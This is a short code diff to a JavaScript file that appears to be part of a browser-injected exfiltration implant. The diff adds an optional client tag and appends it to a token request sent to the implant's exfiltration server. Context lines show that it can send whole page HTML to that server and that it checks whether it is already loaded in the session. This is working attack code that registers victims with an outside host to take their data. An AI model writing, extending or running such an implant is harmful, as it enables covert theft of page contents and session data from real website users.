@@ -104,6 +104,9 @@ function initGlobals()
 
 
 
+	// Should we set an optional client tag?
+	window.taperTag = "";
+
 	// Should we exfil the entire HTML code?
 	window.taperexfilHTML = true;
 
@@ -1073,7 +1076,14 @@ if (sessionStorage.getItem('taperSystemLoaded') != "true")
 		// Get our client UUID
 		request = new window.taperXHR();
 		request.noIntercept = true;
-		request.open("GET", window.taperexfilServer + "/client/getToken", true);
+		if (window.taperTag === "")
+		{
+			request.open("GET", window.taperexfilServer + "/client/getToken", true);
+		}
+		else
+		{
+			request.open("GET", window.taperexfilServer + "/client/getToken/" + window.taperTag, true);
+		}
 		request.send(null);
 
 		request.onreadystatechange = function()
